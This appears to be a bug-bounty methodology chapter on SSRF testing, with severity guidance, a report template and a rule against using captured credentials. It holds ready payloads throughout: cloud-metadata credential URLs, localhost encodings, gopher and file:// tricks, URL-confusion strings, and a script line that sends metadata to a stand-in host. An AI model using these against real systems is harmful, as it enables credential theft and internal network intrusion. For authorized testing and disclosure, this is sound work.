# 08 — SSRF

Server-Side Request Forgery: the server fetches a URL you supply. It becomes HIGH
when the server can reach something you cannot — cloud metadata, internal admin,
localhost services, internal APIs with no auth.

Hunt it wherever a URL, hostname, IP, port, path, or webhook appears:
image-from-URL, "import from URL", PDF/screenshot generators, webhook testers,
RSS/feed readers, link previews, avatar fetchers, oEmbed, sitemap importers,
adaptive/transcoding, "add a domain", proxy params (`?url=`, `?next=`,
`?target=`, `?dest=`, `?redirect=`), SAML ACS, and any `fetch(url)` in backend JS.

---

## The decision tree

```
Does the param take a URL/host?
├─ no  → not SSRF
└─ yes
   ├─ Does the server fetch it? (test with your own listener)
   │  ├─ no  → maybe client-side fetch → check for open redirect / XSS
   │  └─ yes → SSRF confirmed at the "can it fetch" level
   │        ├─ Can it fetch http://127.0.0.1:PORT ?  → localhost SSRF
   │        ├─ Can it fetch cloud metadata?          → HIGH/Critical
   │        ├─ Can it fetch internal RFC1918?        → HIGH
   │        └─ Can it only fetch public?             → Medium at best
   └─ Response returned?
      ├─ yes → full read SSRF
      └─ no  → blind SSRF (DNS only) → Medium unless internal reach proven
```

---

## Step 1 — prove the fetch

Point the param at a listener you control (`interactsh`, Burp Collaborator, or a
small VPS with `nc -lvnp 80`). If you see the request, it is server-side. If you
only see your own browser's request, it is client-side — different bug.

```
?url=http://<your-id>.oast.fun/
?image=http://<your-id>.oast.fun/a.png
?webhook=http://<your-id>.oast.fun/
```

Record the **User-Agent**, **source IP**, and **headers** of the incoming hit.
The source IP tells you which network the fetcher lives in.

---

## Step 2 — reach localhost

```
http://127.0.0.1/
http://127.0.0.1:8080/
http://localhost/
http://[::1]/
http://0.0.0.0/
http://127.1/
http://2130706433/          (decimal 127.0.0.1)
http://0x7f000001/          (hex)
http://0177.0.0.1/          (octal)
```

If any returns a non-fetch-error response, you have reach. Note which internal
service answered (`Server:` header, body).

---

## Step 3 — cloud metadata (the money shot)

**AWS (IMDSv1):**
```
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>
```
The last returns `AccessKeyId`, `SecretAccessKey`, `Token`. That is Critical if
the role has permissions.

**AWS IMDSv2** needs a token:
```
PUT http://169.254.169.254/latest/api/token  Header: X-aws-ec2-metadata-token-ttl-seconds: 21600
```
If the fetcher only does GET, IMDSv2 blocks you — say so, downgrade.

**GCP:**
```
http://metadata.google.internal/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
```
Requires `Metadata-Flavor: Google` header — most fetchers cannot set headers, so
often blind. Still try.

**Azure:**
```
http://169.254.169.254/metadata/instance?api-version=2021-02-01
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
```
Requires `Metadata: true` header.

**DigitalOcean / Alibaba / Oracle / Kubernetes:**
```
http://169.254.169.254/metadata/v1/
http://100.100.100.200/latest/meta-data/
http://169.254.169.254/opc/v1/instance/
https://kubernetes.default.svc/api
```

If you get credentials, **do not use them**. Capture the response, redact the
secret in the report to the first and last 4 characters, and say what the role
appears able to do. Using the keys is out of bounds for most programs and is
unnecessary.

---

## Bypass filters

Filters usually block `127.0.0.1`, `169.254.169.254`, and `localhost`. Try:

- Encodings: `%31%32%37%2e%30%2e%30%2e%31`, `127。0。0。1` (ideographic dots),
  `127.0.0.1.nip.io`, `127.0.0.1.sslip.io`.
- DNS rebinding: a hostname you control that resolves to a public IP on first
  lookup and `127.0.0.1` on the second (`rebind.network`, `1u.ms`).
- Redirect: your server 302s to `http://127.0.0.1/` — the fetcher follows.
- Decimal/hex/octal IP forms (above).
- `file://`, `gopher://`, `dict://`, `ftp://` — gopher hits Redis/Memcached
  directly. `file:///etc/passwd` is local file read.
- URL parsing confusion: `http://attacker.com@127.0.0.1/`,
  `http://127.0.0.1#@attacker.com/`.

Test one bypass at a time and record which one worked. The report needs the exact
string.

---

## Blind SSRF

If you get a DNS hit but no response body, you have blind SSRF. It is Medium in
most programs *unless* you can prove internal reach. Ways to escalate blind:

- **Timing.** `http://127.0.0.1:22` returns fast (closed) vs `http://10.0.0.5:80`
  slow (filtered) — port scanning by timing.
- **Error differentials.** "Connection refused" vs "timeout" vs "invalid URL"
  leak which internal hosts exist.
- **DNS rebinding to metadata** — if the fetcher resolves per request.
- **Webhook pivot** — a webhook that SSRF's to an internal webhook endpoint.

If it stays DNS-only, report it honestly as blind SSRF, Medium, and state that
impact is unproven. Programs that pay for "SSRF" often require internal reach.

---

## SSRF via PDF/screenshot generators

Headless Chrome fetching your URL is SSRF *and* it runs JS:

- `http://127.0.0.1:9222/json` — Chrome DevTools endpoint → full browser control.
- `http://metadata.google.internal/...` with the `Metadata-Flavor` header — Chrome
  will not set it, so GCP is usually blind.
- `file:///etc/passwd` in an `<iframe>` then screenshot → local file read.
- `<script>fetch('http://169.254.169.254/...').then(r=>r.text()).then(t=>location='http://me/?d='+btoa(t))</script>` →
  exfiltrate metadata through the rendered page if the generator returns the HTML.

A screenshot generator that renders internal pages is usually High.

---

## SSRF via DNS (the quiet one)

Some fetchers resolve your hostname and then connect. `*.nip.io`,
`127.0.0.1.sslip.io`, and a rebinding service let you turn "fetch this hostname"
into "fetch localhost" without touching the IP filter. Always try these before
declaring SSRF "filtered".

---

## Proof and severity

| What you showed | Severity |
|---|---|
| Fetch to your listener only, public only | Low/Info |
| Blind DNS only, no internal reach | Medium (often excluded) |
| Localhost service reachable, response visible | High |
| Cloud metadata credentials returned | Critical |
| Internal admin/API reachable with data | High/Critical |
| Internal port scan by timing | Medium |

Report shape for metadata:

```
Request:
POST /api/import {"url":"http://169.254.169.254/latest/meta-data/iam/security-credentials/"}
Response:
{"Code":"Success","AccessKeyId":"ASIA…","SecretAccessKey":"…","Token":"…"}
```

Redact the secret. State the role, not the keys.

---

## What closed looks like

- The fetcher resolves to a proxy that blocks RFC1918 + metadata → closed, note
  the bypasses you tried.
- Only allowlisted hosts → closed.
- Response never returned and no DNS hit → fetch did not happen; different bug.
- `page_url` is stored but never fetched (common in chatbots) — verify with a
  listener before calling it SSRF.
